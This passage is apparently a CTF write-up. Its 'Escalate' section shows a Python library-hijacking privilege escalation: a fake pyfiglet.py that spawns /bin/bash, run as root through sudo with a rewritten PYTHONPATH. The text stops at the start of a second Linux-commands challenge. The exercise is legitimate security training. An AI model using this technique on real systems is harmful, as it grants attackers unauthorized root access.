<h1>Escalate</h1>
<i>Description: I think we need a new system admin :)</i><br>
<br>🕵🏻‍♀️ Let's start the challenge and click the link. Login using ctf:ctf<br>
<br><img width="350" alt="image" src="https://github.com/user-attachments/assets/123d71dc-7ab4-45e8-ab61-2725a253371b"><br>

<br>🕵🏻‍♀️ As you can see, there's nothing much we can do here. I decide to check what permission I have using `sudo -l`.<br>
<br><img width="650" alt="image" src="https://github.com/user-attachments/assets/5d60256a-e2ad-4637-ad91-b921526ef7b9"><br>

<br>🕵🏻‍♀️ This is what cool.py could do. Cool right?<br>
<br><img width="350" alt="image" src="https://github.com/user-attachments/assets/bde64309-1ac6-46c4-bc3a-a573fd7c0c7f"><br>

<br>🕵🏻‍♀️ I decide to check into the code and found something interesting. Here's the cool.py file<br>
<pre>
import pyfiglet

user_name = input("> Enter your name to be c00l:")
print(pyfiglet.figlet_format(user_name))
</pre>

<br>🕵🏻‍♀️ We could actually make use of the pyfiglet library to do <a href="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8">library hijacking</a>. Let's create a new file using `nano pyfiglet.py`
<pre>
#!/usr/bin/env/python3
import os
os.system("/bin/bash")
</pre>
This code is to make sure you could use Python to spawn a root shell

🕵🏻‍♀️ After that, don't forget to use `chmod +x pyfiglet.py` to make the file executable. 
<br>We'll get root if we use `sudo PYTHONPATH=/home/ctf /usr/bin/python3 /opt/cool.py`<br>
<br><img width="900" alt="image" src="https://github.com/user-attachments/assets/62554faf-ec58-4c02-8263-73014ff2198e"><br>

🕵🏻‍♀️ Alright let me explain what's going on here. By manipulating the PYTHONPATH environment variable, I effectively redirected Python to use the modified version of the pyfiglet module, which included a command to spawn a shell.<br>
<br>You may head to root directory to get the flag. (Please ignore the typos)<br>
<br><img width="600" alt="image" src="https://github.com/user-attachments/assets/529f5c72-3b46-4674-a3be-d614ea52e52f"><br>

<h1>Linuxcmd 101</h1>
<i>Description: This Challenge will help you understand essential commands in Linux OS. Each point is linked to another point, connect the link and win the Flag!</i><br>
<br>You may download the challenge zip <a href="https://hubchallenges.s3-eu-west-1.amazonaws.com/Forensics/linux-chal.tar.gz">here</a><br>
<br>🕵🏻‍♀️ Let's start with unzipping the file using `tar -xzvf`<br>
<br><img width="350" alt="image" src="https://github.com/user-attachments/assets/922d50bf-1b2d-4379-b8b5-c9ee69cc3021"><br>

